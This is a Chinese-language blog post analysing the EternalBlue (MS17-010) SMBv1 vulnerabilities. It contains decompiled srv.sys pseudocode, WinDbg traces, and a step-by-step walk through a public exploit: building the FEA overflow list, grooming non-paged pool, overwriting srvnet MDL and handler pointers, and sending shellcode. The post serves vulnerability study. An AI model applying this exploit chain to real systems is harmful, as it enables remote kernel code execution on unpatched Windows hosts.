---
layout: post 
title: "EternalBlue(MS17-010) 漏洞分析"
categories: "BinarySecurity"
---

#### 0x00 前言

MS17-010让世界又见识到了远程溢出拿shell的故事，尤其是在现如今这样的漏洞少之又少的情况下显得更加震惊，这篇文章主要是为了梳理相关的漏洞点和具体的利用触发流程

#### 0x01 先关注MS17-010中使用的三个关键漏洞

<strong>第一个：漏洞即Fea list转换NT Fea list触发的overflow；通过srv buff对象覆盖了后续的srvnet buff的结构体</strong>

问题出现再SrvOs2FeaListSizeToNt 函数中，伪代码如下：

```c
unsigned int __fastcall SrvOs2FeaListSizeToNt(int pOs2Fea)
{
  unsigned int v1; // edi@1
  int Length; // ebx@1
  int pBody; // esi@1
  unsigned int v4; // ebx@1
  int v5; // ecx@3
  int v8; // [sp+10h] [bp-8h]@3
  unsigned int v9; // [sp+14h] [bp-4h]@1

  v1 = 0;
  Length = *(_DWORD *)pOs2Fea;	// 这里以DWORD类型获取length
  pBody = pOs2Fea + 4;
  v9 = 0;
  v4 = pOs2Fea + Length;
  while ( pBody < v4 )
  {
    if ( pBody + 4 >= v4
      || (v5 = *(_BYTE *)(pBody + 1) + *(_WORD *)(pBody + 2),
          v8 = *(_BYTE *)(pBody + 1) + *(_WORD *)(pBody + 2),
          v5 + pBody + 5 > v4) )
    {
      // 这里以WORD更新length的低位2字节
      // 初始值是0x10000,最终变成了0x1ff7E
      *(_WORD *)pOs2Fea = pBody - pOs2Fea;
      return v1;	// 这里返回的大小为后续用于内存申请
    }
    if ( RtlULongAdd(v1, (v5 + 0xC) & 0xFFFFFFFC, &v9) < 0 )
      return 0;
    v1 = v9;
    pBody += v8 + 5;
  }
  return v1;
}
```

使用windbg来动态调试，先查询SrvOs2FeaListToNt中 SrvOs2FeaListSizeToNt 调用的结果：

```
kd> p
srv!SrvOs2FeaListToNt+0x15:
a6f7a57a 8b7510          mov     esi,dword ptr [ebp+10h]
kd> r
eax=00010fe8 ebx=884241e0 ecx=837a70ea edx=0000008f esi=83797008 edi=837970d8
eip=a6f7a57a esp=90b2bb70 ebp=90b2bb7c iopl=0         nv up ei pl nz ac pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000216
srv!SrvOs2FeaListToNt+0x15:
a6f7a57a 8b7510          mov     esi,dword ptr [ebp+10h] ss:0010:90b2bb8c=90b2bba8

# 断点
bp srv!SrvOs2FeaListToNt+0x10
bp srv!SrvOs2FeaListToNt+0x33
```

此时获取到的大小为0x10fe8，后续变更该值进行内存申请(减去9字节)

```
srv!SrvOs2FeaListSizeToNt+0X5E
96759506 2bf0            sub     esi,eax
96759508 668930          mov     word ptr [eax],si		# 这里更新size以WORD类型
```

调试中可以看到对应的size大小

```
kd> r
eax=a381b0d8 ebx=0000008f ecx=a382b0ea edx=0000008f esi=0000ff7e edi=a382b0d8
eip=96759508 esp=8ca43b54 ebp=8ca43b64 iopl=0         nv up ei pl nz ac pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000216
srv!SrvOs2FeaListSizeToNt+0x60:
96759508 668930          mov     word ptr [eax],si        ds:0023:a381b0d8=0000
```

si为: 0xff7e, 在SrvOs2FeaListToNt函数中获取到size值后会引用该值设置边界值，伪代码如下：

```c
unsigned int __fastcall SrvOs2FeaListToNt(int pOs2Fea, int *pArgNtFea, int *a3, _WORD *a4)
{
  __int16 v5; // bx@1
  unsigned int Size; // eax@1
  NTFEA *pNtFea; // ecx@3
  int pOs2FeaBody; // esi@9
  int v10; // edx@9
  unsigned int v11; // esi@14
  int v12; // [sp+Ch] [bp-Ch]@11
  unsigned int v14; // [sp+20h] [bp+8h]@9

  v5 = 0;
  Size = SrvOs2FeaListSizeToNt(pOs2Fea);	// 获取的大小为0x10fe8
  *a3 = Size;
  if ( !Size )
  {
    *a4 = 0;
    return 0xC098F0FF;
  }
  pNtFea = (NTFEA *)SrvAllocateNonPagedPool(Size, 0x15);	// 内存申请
  *pArgNtFea = (int)pNtFea;
  if ( pNtFea )
  {
    pOs2FeaBody = pOs2Fea + 4;		// 后续引用该值为遍历的起始地址
    v10 = (int)pNtFea;
    v14 = pOs2Fea + *(_DWORD *)pOs2Fea - 5;		// 这里设置边界地址size-5
    if ( pOs2Fea + 4 > v14 )
    {
LABEL_13:
      if ( pOs2FeaBody == pOs2Fea + *(_DWORD *)pOs2Fea )
      {
        *(_DWORD *)v10 = 0;
        return 0;
      }
      v11 = 0xC0000001;
      *a4 = v5 - pOs2Fea;
    }
    else
    {
      while ( !(*(_BYTE *)pOs2FeaBody & 0x7F) )
      {
        v12 = (int)pNtFea;
        v5 = pOs2FeaBody;		// 起始地址
        pNtFea = (NTFEA *)SrvOs2FeaToNt(pNtFea, pOs2FeaBody);	// memmove触发
        pOs2FeaBody += *(_BYTE *)(pOs2FeaBody + 1) + *(_WORD *)(pOs2FeaBody + 2) + 5;
		// 目标地址pNtFea的大小为：0x10fe8
        // 源地址pOs2FeaBody的大小为：0x1ff75
        // 此时发生了越界操作
        if ( pOs2FeaBody > v14 )
        {
          v10 = v12;
          goto LABEL_13;
        }
      }
      *a4 = pOs2FeaBody - pOs2Fea;
      v11 = 0xC000000D;
    }
    SrvFreeNonPagedPool(*pArgNtFea);
    return v11;
  }
  if ( BYTE1(WPP_GLOBAL_Control->Flags) >= 2u && WPP_GLOBAL_Control->Characteristics & 1 && KeGetCurrentIrql() < 2u )
  {
    _DbgPrint("SrvOs2FeaListToNt: Unable to allocate %d bytes from nonpaged pool.", *a3, 0);
    _DbgPrint("\n");
  }
  return 0xC0000205;
}
```

动态调试以下汇编代码可以获取到用于边界判断的地址范c围：

```
a6f7a5f1 f6067f          test    byte ptr [esi],7Fh
a6f7a5f4 753c            jne     srv!SrvOs2FeaListToNt+0xcd (a6f7a632)
a6f7a5f6 56              push    esi			// 这里为起始地址
a6f7a5f7 50              push    eax
a6f7a5f8 894508          mov     dword ptr [ebp+8],eax
a6f7a5fb 8975fc          mov     dword ptr [ebp-4],esi
a6f7a5fe e828fcffff      call    srv!SrvOs2FeaToNt (a6f7a22b)
a6f7a603 0fb65601        movzx   edx,byte ptr [esi+1]
a6f7a607 0fb74e02        movzx   ecx,word ptr [esi+2]
a6f7a60b 03d6            add     edx,esi
a6f7a60d 8d740a05        lea     esi,[edx+ecx+5]
a6f7a611 3bf3            cmp     esi,ebx		// 获取ebx即可得到边界地址

# 断点
bp srv!SrvOs2FeaListToNt+0x91	获取起始地址
bp srv!SrvOs2FeaListToNt+0xac	获取边界地址
```

通过边界地址-起始地址可以得到具体的大小

```
srv!SrvOs2FeaListToNt+0x91:
a6f7a5f6 56              push    esi
kd> r
eax=865a5008 ebx=8ef72051 ecx=0001ff7e edx=00000000 esi=8ef520dc edi=8ef520d8
eip=a6f7a5f6 esp=8ba67b6c ebp=8ba67b7c iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
srv!SrvOs2FeaListToNt+0x91:
a6f7a5f6 56              push    esi

srv!SrvOs2FeaListToNt+0xac:
a6f7a611 3bf3            cmp     esi,ebx
kd> r
eax=865a5014 ebx=8ef72051 ecx=00000000 edx=8ef520dc esi=8ef520e1 edi=8ef520d8
eip=a6f7a611 esp=8ba67b6c ebp=8ba67b7c iopl=0         nv up ei ng nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282
srv!SrvOs2FeaListToNt+0xac:
a6f7a611 3bf3            cmp     esi,ebx

ebx - esi = 0x8ef72051 - 0x8ef520dc = 0x1ff75
```

在前面SrvOs2FeaListSizeToNt获取的大小也就是申请的内存大小为：0x10fe8，而使用的边界大小为：0x1ff75(这里为什么与size有出入是因为起始地址移动了4字节，同时边界大小也减小了5字节)

为了查看溢出覆盖的具体细节，需要定位到执行最后一次memmove的操作：

* 通过while循环跳出，在跳出位置下断点，计算循环了多少次
* 直接通过memmove设置条件断点(通过payload知道大部分的操作复制字节数都为0)

SrvOs2FeaToNt伪代码：

```c
unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)
{
  int v4; // edi@1
  _BYTE *v5; // edi@1
  unsigned int result; // eax@1

  v4 = a1 + 8;
  *(_BYTE *)(a1 + 4) = *(_BYTE *)a2;
  *(_BYTE *)(a1 + 5) = *(_BYTE *)(a2 + 1);
  *(_WORD *)(a1 + 6) = *(_WORD *)(a2 + 2);
  _memmove((void *)(a1 + 8), (const void *)(a2 + 4), *(_BYTE *)(a2 + 1));
  v5 = (_BYTE *)(*(_BYTE *)(a1 + 5) + v4);
  *v5++ = 0;
  _memmove(v5, (const void *)(a2 + 5 + *(_BYTE *)(a1 + 5)), *(_WORD *)(a1 + 6)); //这里产生的越界覆盖
  result = (unsigned int)&v5[*(_WORD *)(a1 + 6) + 3] & 0xFFFFFFFC;
  *(_DWORD *)a1 = result - a1;
  return result;
}
```

第一种：判定while循环执行了多少次c

```
# 这里通过临时寄存器来计数
r $t0=0

# a6f7a5f4 753c            jne     srv!SrvOs2FeaListToNt+0xcd (a6f7a632)
bp srv!SrvOs2FeaListToNt+0x8f ".if (@zf=0) {} .else {gc}"

# a6f7a5f6 56              push    esi			// 这里为起始地址
bp srv!SrvOs2FeaListToNt+0x91 "r $t0=@$t0+1;g;"

# 查看计数
kd> r $t0
$t0=0000025b
```

第二种：通过srv!SrvOs2FeaToNt中的memmove下断进行定位

```
bp srv!SrvOs2FeaToNt+0x4d ".if (poi(esp+8) != 0) {gc} .else {}"
```

这里是因为payload知道了memmove前面都是进行0字节的copy。

```
kd> dd esp
94b1bb38  86adec31 a2e86c99 0000f3bd 86adec30

kd> dd esp
94b1bb38  86aedff9 a2e9605b 0000008f 86aedff8		// 最后一次的大小为0x8f
```

通过上面可以知道，目标地址为：86aedff9，复制的字节数为：0x8f；

接着查看pool信息：

```
kd> !pool 86aedff9
Pool page 86aedff9 region is Nonpaged pool
*86add000 : large page allocation, Tag is LSdb, size is 0x11000 bytes
		Pooltag LSdb : data buffer
		
kd> ? 86aedff9 +8f
Evaluate expression: -2035359608 = 86aee088		// 越界后结束地址

kd> !pool 86aee088
Pool page 86aee088 region is Nonpaged pool
 86aee000 size:    8 previous size:    0  (Free)       ....
*86aee000 : large page allocation, Tag is LSbf, size is 0x11000 bytes
		Pooltag LSbf : buffer descriptor
```

发生了越界覆盖

查看覆盖前的内存信息：

```
kd> db 86aee000 86aee000+88
86aee000  00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00  ................
86aee010  ff ff 00 00 c0 f0 df ff-c0 f0 df ff 00 00 00 00  ................
86aee020  00 00 00 00 64 0b 00 00-00 f1 df ff 00 00 00 00  ....d...........
86aee030  00 00 00 00 10 e0 ae 86-00 f1 df ff 00 00 00 00  ................
86aee040  60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00  `...............
86aee050  10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff  ................
86aee060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
86aee070  60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00  `...............
86aee080  90 ff cf ff ff ff ff ff-fa 
```

查看覆盖后的内存信息：

```
kd> db 86aee000 86aee000+88
86aee000  00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00  ................
86aee010  ff ff 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
86aee020  00 00 00 00 00 00 00 00-00 f1 df ff 00 00 00 00  ................
86aee030  00 00 00 00 20 f0 df ff-00 f1 df ff 00 00 00 00  .... ...........
86aee040  60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00  `...............
86aee050  10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff  ................
86aee060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
86aee070  60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00  `...............
86aee080  90 ff cf ff ff ff ff ff-fa
```

<strong>第二个：发送SMB_COM_NT_TRANSACT并附带FEA LIST和多个transcation，服务端会通过 SMB_COM_TRANSACTION2_SECONDARY将SMB_COM_NT_TRANSACT作为SMB_COM_TRANSACTION2处理；通过这种方式可以传入FEA LIST大于0xffff大小的数据，因为SMB_COM_NT_TRANSACT长度字段类型为ULONG，而SMB_COM_TRANSACTION2为USHORT类型</strong>

核心问题：对于 transaction类型的校验，只是以最后接收的*_SECONDARY类型为准，因此可以通过SMB_COM_NT_TRANSACT传递payload，并以SMB_COM_TRANSACTION2_SECONDARY结尾，这样就造成了错误解析，将SMB_COM_NT_TRANSACT以SMB_COM_TRANSACTION2类型进行解析

SMB Message Structure

```
# The SMB_Header structure is a fixed 32-bytes in length.
SMB_Header
{
UCHAR Protocol[4];
UCHAR Command;
SMB_ERROR Status;
UCHAR Flags;
USHORT Flags2;
USHORT PIDHigh;
UCHAR SecurityFeatures[8];
USHORT Reserved;
USHORT TID;
USHORT PIDLow;
USHORT UID;
USHORT MID;
}
# SMB_Parameters
{
UCHAR WordCount;
USHORT Words[WordCount] (variable);
}
# SMB_Data
{
USHORT ByteCount;
UCHAR Bytes[ByteCount] (variable);
}
```

通过PID、MID、TID、UID来匹配是否相同，会在服务端将其组装为同一类型trancation

<strong>第三个：在处理 SMB_COM_SESSION_SETUP_ANDX 命令时，会以13类型的请求方式处理12请求的数据；这样既可以稳定控制连续pool内存的申请和释放</strong>

SMB_COM_TREE_CONNECT_ANDX
SMB_COM_SESSION_SETUP_ANDX

```
# SMB_COM_SESSION_SETUP_ANDX
#  LM and NTLM authentication
#  NT Security request
SMB_Parameters
{
UCHAR WordCount;		// 0xD = 13
Words
{
UCHAR AndXCommand;
UCHAR AndXReserved;
USHORT AndXOffset;
USHORT MaxBufferSize;
USHORT MaxMpxCount;
USHORT VcNumber;
ULONG SessionKey;
USHORT OEMPasswordLen;
USHORT UnicodePasswordLen;
ULONG Reserved;
ULONG Capabilities;
} }
SMB_Data
{
USHORT ByteCount;
Bytes
{
UCHAR OEMPassword[];
UCHAR UnicodePassword[];
UCHAR Pad[];
SMB_STRING AccountName[];
SMB_STRING PrimaryDomain[];
SMB_STRING NativeOS[];
SMB_STRING NativeLanMan[];
} }

# extended security request
 SMB_Parameters
   {
   UCHAR  WordCount;	// 0xC = 12
   Words
     {
     UCHAR  AndXCommand;
     UCHAR  AndXReserved;
     USHORT AndXOffset;
     USHORT MaxBufferSize;
     USHORT MaxMpxCount;
     USHORT VcNumber;
     ULONG  SessionKey;
     USHORT SecurityBlobLength;
     ULONG  Reserved;
     ULONG  Capabilities;
     }
   }
 SMB_Data
   {
   USHORT ByteCount;
   Bytes
     {
     UCHAR      SecurityBlob[SecurityBlobLength];
     SMB_STRING NativeOS[];
     SMB_STRING NativeLanMan[];
     }
   }
```

漏洞函数BlockingSessionSetupAndX伪代码如下：

```c
BlockingSessionSetupAndX(request, smbHeader)
{
	// check word count
	if (! (request->WordCount == 13 || (request->WordCount == 12 && (request->Capablilities & CAP_EXTENDED_SECURITY))) ) {
    // error and return
	}
	// ...
	if ((request->Capablilities & CAP_EXTENDED_SECURITY) && (smbHeader->Flags2 & FLAGS2_EXTENDED_SECURITY)) {
    	// this request is Extend Security request
    	GetExtendSecurityParameters(request);  // extract parameters and data to variables
    	SrvValidateSecurityBuffer(request);  // do authentication
	}
	else {
    	// this request is NT Security request
    	GetNtSecurityParameters(request);  // extract parameters and data to variables
    	SrvValidateUser(request);  // do authentication
	}
// ...
}
```

发送Extended Security request(12)附带CAP_EXTENDED_SECURITY，并未附带FLAG2_EXTENDED_SECURITY，将该请求伪装成为SMB_COM_SESSION_SETUP_ANDX(13)

这样就会将请求以NT Security request(13)进行处理，进入函数GetNtSecurityParameters,在该函数中会通过wordcount和bytecount计算申请的内存大小，但12类型和13类型中的bytecount偏移不同，因此当12类型被作为13类型解析时，会解析到SecurityBlob作为bytecount大小

这里的主要问题是：当设定FLAGS2_EXTENDED_SECURITY和CAP_EXTENDED_SECURITY，则将请求按照Extended Security request(12)处理，否则按照NT Security request(13)进行处理。

在payload中的利用：

```c
sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20	// 这里最终解析12类型中SMB_Data.Bytes的头两个字节为解析的大小(在13类型中的ByteCount)
```

这里的sessionSetup['Data']即为SMB_Data.Bytes,因此头两个字节就是reqSize

至此三个漏洞搞明白后，但对于整个漏洞链是如何串起来的还是比较模糊，例如：

* 如何利用漏洞1的越界来触发命令执行
* 如何利用漏洞2传入FEA LIST，也就是可控的数据用来触发漏洞1
* 漏洞3只是进行了Non-Paged pool申请，实现了占坑但没有进行释放，内部布局如何构造

#### 0x02 越界如何触发命令执行

为了触发命令执行，这里引出关键数据结构srvnet，其中有2个关键字段：

* MDL(pMDl1): memory descriptor list;将I/O数据写入到指定的MDL指定虚拟地址中，在实际利用中client发送的数据会写入到指定的虚拟地址中，这样就可以传入可控的数据到指定的地址
* pSrvNetWskStruct: 指向SrvNetWskStruct结构体，该结构体中存在一个函数指针HandlerFunction，该函数会在srvnet连接中断时进行调用；那么如果pSrvNetWskStruct指向的结构体是伪造的，那么就可以很顺利的触发命令执行

这里利用的地址为HAL的heap的固定地址，因为在该段地址是可执行的

```
0xffd00000		# 32位
0xffffffff ffd00000	# 64位
```

只要能通过越界控制这两个字段就可以了，但如何将srv buff和srvnet buff拼接到一起？

#### 0x03 如何通过请求触发漏洞

这里结合exp，来看整个请求流程是如何进行的：

srv分配：SMBv1数据包可以触发srv的内存申请，类型为paged或者non-paged pool

srvnet分配： SMBv2数据包可以触发srvnet的内存申请，类型为paged或者non-paged pool

一、发送fealist分配srv：

```
send_big_trans2(conn, tid, 0, feaList, '\x00'*30, 2000, False)
```

这里利用了漏洞2并且保留最后的fragment不发送，其中fealist的内容如下：

```
NTFEA_SIZE = 0x11000
ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # 这里对应的ntfea size是0x1c20，因为每一条fea记录转化为NTfea时都会增加5个字节
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc
ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }
feaList = pack('<I', 0x10000)
feaList += ntfea[NTFEA_SIZE]
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer	# 需要越界覆盖的东西
feaList += pack('<BBH', 0x12, 0x34, 0x5678) # 无效的记录，会触发转换异常
```

这里对应的fealist的结构体如下：

```
typedef struct _FEA {   /* fea */
    BYTE fEA;        /* flags*/
    BYTE cbName;     /* name length not including NULL */
    USHORT cbValue;  /* value length */
} FEA, *PFEA;
 
typedef struct _FEALIST {    /* fealist */
    DWORD cbList;   /* total bytes of structure including full list */
    FEA list[1];    /* variable length FEA structures */
} FEALIST, *PFEALIST;
```

二、利用bug3申请大小为：`NTFEA_SIZE-0x1010`的non-paged pool内存

```
allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
```

这块内存的申请是为了确保后续NTFEA的内存可以与srvnet相邻

三、申请多个srvnet进行占坑：

```
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
```

四、利用bug3申请大小为：`NTFEA_SIZE-0x10`的non-paged pool内存

```
holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
```

这块内存是用来确保NTFEA使用，接着让srvnet与这块内存相邻即可

五、释放第二步申请的内存，这样可以确保临时申请的一些小内存不会直接添加到holeConn后面，阻碍srvnet的占用

```
allocConn.get_socket().close()
```

六、申请srvnet，仅靠holeConn：

```
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
```

这里申请多个，只有一个可以仅靠holeConn，那么就算是成功了

七、此时内存布局基本完成，释放holeConn，准备触发整个漏洞链

```
holeConn.get_socket().close()
```

八、发送fealist最后一个fragment，此时会触发bug1的越界操作

```
send_trans2_second(conn, tid, feaList[progress:], progress)
```

这里通过响应来判断是否发生越界，因为构造的fealist最后一条记录是非法记录，转换肯定会报错：

```
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
```

九、完成了越界后，借助srvnet覆盖后的MDL，向HAL's heap地址传入shellcode

```
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)
```

十、最后断开链接触发命令执行：

```
	for sk in srvnetConn:
		sk.close()
```

参考：

https://github.com/worawit/MS17-010/blob/master/eternalblue_exploit7.py
https://www.slideshare.net/cisoplatform7/demystifying-ms17010-reverse-engineering-the-eternal-exploits

https://yi0934.github.io/2019/04/08/CVE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ms17-010/

https://www.anquanke.com/post/id/87168

https://paper.seebug.org/280/ 

https://research.checkpoint.com/2017/eternalblue-everything-know/ 

https://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/ 

https://github.com/3ndG4me/AutoBlue-MS17-010/ 

https://www.schauer.fr/wp-content/uploads/2018/02/msrpc_null_sessions.pdf 

